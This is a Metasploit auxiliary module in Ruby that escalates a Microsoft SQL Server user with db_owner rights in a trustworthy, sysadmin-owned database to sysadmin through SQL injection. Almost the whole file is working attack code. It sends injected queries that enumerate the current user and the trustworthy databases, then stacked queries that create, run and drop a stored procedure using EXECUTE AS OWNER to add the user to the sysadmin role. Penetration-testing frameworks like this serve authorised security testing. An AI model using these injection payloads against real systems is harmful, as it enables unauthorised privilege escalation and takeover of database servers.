##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/mssql_commands'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::MSSQL_SQLI
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SQL Server - Escalate Db_Owner - SQLi',
      'Description'    => %q{
        This module can be used to escalate privileges to sysadmin if the user has
        the db_owner role in a trustworthy database owned by a sysadmin user.  Once
        the user has the sysadmin role the mssql_payload_sqli module can be used to obtain
        a shell on the system.

        Syntax for injection URLs:

        Error: /account.asp?id=1+and+1=[SQLi];--
      },
      'Author'         =>
        [
          'nullbind <scott.sutherland[at]netspi.com>'
        ],
      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],
      'License'        => MSF_LICENSE,
      'References'     => [[ 'URL','http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']]
    ))
  end

  def run

    # Get the database user name
    print_status("Grabbing the database user name from #{rhost}:#{rport}...")
    db_user = get_username
    print_good("Database user: #{db_user}")

    # Grab sysadmin status
    print_status("Checking if #{db_user} is already a sysadmin...")
    sysadmin_status = check_sysadmin
    if sysadmin_status == 1
      print_good("#{db_user} is already a sysadmin, no esclation needed.")
      return
    else
      print_good("#{db_user} is NOT a sysadmin, let's try to escalate privileges.")
    end

    # Check for trusted databases owned by sysadmins
    print_status("Checking for trusted databases owned by sysadmins...")
    trust_db_list = check_trust_dbs
    if trust_db_list.nil? || trust_db_list.length == 0
      print_error('No databases owned by sysadmin were found flagged as trustworthy.')
      return
    else
      # Display list of accessible databases to user
      print_good("#{trust_db_list.length} affected database(s) were found:")

      if trust_db_list.length == 1
        trust_db_one = trust_db_list.flatten.first
        print_status(" - #{trust_db_one}")
      else
        trust_db_list.each do |db|
          print_status(" - #{db[0]}")
        end
      end
    end

    # Check if the user has the db_owner role in any of the databases
    print_status("Checking if #{db_user} has the db_owner role in any of them...")
    dbowner_status = check_db_owner(trust_db_list)
    if dbowner_status.nil?
      print_error("Fail buckets, the user doesn't have db_owner role anywhere.")
      return
    else
      print_good("#{db_user} has the db_owner role on #{dbowner_status}.")
    end

    # Attempt to escalate to sysadmin
    print_status("Attempting to add #{db_user} to sysadmin role...")
    escalate_status = escalate_privs(dbowner_status,db_user)
    if escalate_status == 1
      print_good("Success! #{db_user} is now a sysadmin!")
    else
      print_error("Fail buckets, something went wrong.")
    end
  end

  #
  # Functions
  #

  def get_username
    # Setup query to check for database username
    sql = "(select 'EVILSQLISTART'+SYSTEM_USER+'EVILSQLISTOP')"

    # Run query
    result = mssql_query(sql)

    # Parse result
    parsed_result =result.body.scan( /EVILSQLISTART([^>]*)EVILSQLISTOP/).last.first

    # Return user name
    return parsed_result
  end

  def check_sysadmin
    # Setup query to check for sysadmin
    sql = "(select 'EVILSQLISTART'+cast((select is_srvrolemember('sysadmin'))as varchar)+'EVILSQLISTOP')"

    # Run query
    result = mssql_query(sql)

    # Parse result
    parsed_result =result.body.scan( /EVILSQLISTART([^>]*)EVILSQLISTOP/).last.first

    # Return sysadmin status
    return parsed_result.to_i
  end

  def check_trust_dbs
    # Setup query to check for trusted databases owned by sysadmins
    sql = "(select cast((SELECT 'EVILSQLISTART'+d.name+'EVILSQLISTOP' as DbName
      FROM sys.server_principals r
      INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id
      INNER JOIN sys.server_principals p ON
      p.principal_id = m.member_principal_id
      inner join sys.databases d on suser_sname(d.owner_sid) = p.name
      WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin' for xml path('')) as int))"

    # Run query
    result = mssql_query(sql)

    #Parse results
    parsed_result = result.body.scan(/EVILSQLISTART(.*?)EVILSQLISTOP/m)

    # Return sysadmin status
    return parsed_result
  end

  def check_db_owner(trust_db_list)
    # Check if the user has the db_owner role is any databases
    trust_db_list.each do |db|
      # Setup query
      sql = "(select 'EVILSQLISTART'+'#{db[0]}'+'EVILSQLISTOP' as DbName
        from [#{db[0]}].sys.database_role_members drm
        join [#{db[0]}].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
        join [#{db[0]}].sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
        where rp.name = 'db_owner' and mp.name = SYSTEM_USER for xml path(''))"

      # Run query
      result = mssql_query(sql)

      # Parse result
      parsed_result =result.body.scan( /EVILSQLISTART([^>]*)EVILSQLISTOP/).last.first

      # Return sysadmin status
      return parsed_result
    end
    nil
  end

  # Attempt to escalate privileges
  def escalate_privs(dbowner_db,db_user)
    # Create the evil stored procedure WITH EXECUTE AS OWNER
    evil_sql_create = "1;use #{dbowner_db};
      DECLARE @myevil as varchar(max)
      set @myevil = '
      CREATE PROCEDURE sp_elevate_me
      WITH EXECUTE AS OWNER
      as
      begin
      EXEC sp_addsrvrolemember ''#{db_user}'',''sysadmin''
      end';
      exec(@myevil);--"
    mssql_query(evil_sql_create)

    # Run the evil stored procedure
    evilsql_run = "1;use #{dbowner_db};
      DECLARE @myevil2 as varchar(max)
      set @myevil2 = 'EXEC sp_elevate_me'
      exec(@myevil2);--"
    mssql_query(evilsql_run)

    # Remove evil procedure
    evilsql_remove = "1;use #{dbowner_db};
      DECLARE @myevil3 as varchar(max)
      set @myevil3 = 'DROP PROCEDURE sp_elevate_me'
      exec(@myevil3);--"
    mssql_query(evilsql_remove)

    # Check sysadmin status
    sysadmin_status = check_sysadmin

    # return parsed_result
    return sysadmin_status.to_i
  end
end
